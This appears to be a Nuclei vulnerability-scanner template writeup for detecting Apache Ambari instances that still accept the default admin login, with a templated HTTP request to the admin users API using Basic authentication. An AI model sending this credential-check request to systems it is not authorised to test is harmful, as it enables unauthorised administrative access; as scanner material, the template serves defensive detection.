# Nuclei Template: Apache Ambari Default Login
**Template ID:** ambari-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`ambari-default-login.yaml`)

## Vulnerability Information & PoC

## Description
An Apache Ambari default admin login was discovered.

## Steps to reproduce / Exploit Payload
```http
GET /api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

## References
- https://ambari.apache.org/1.2.0/installing-hadoop-using-ambari/content/ambari-chap3-1.html
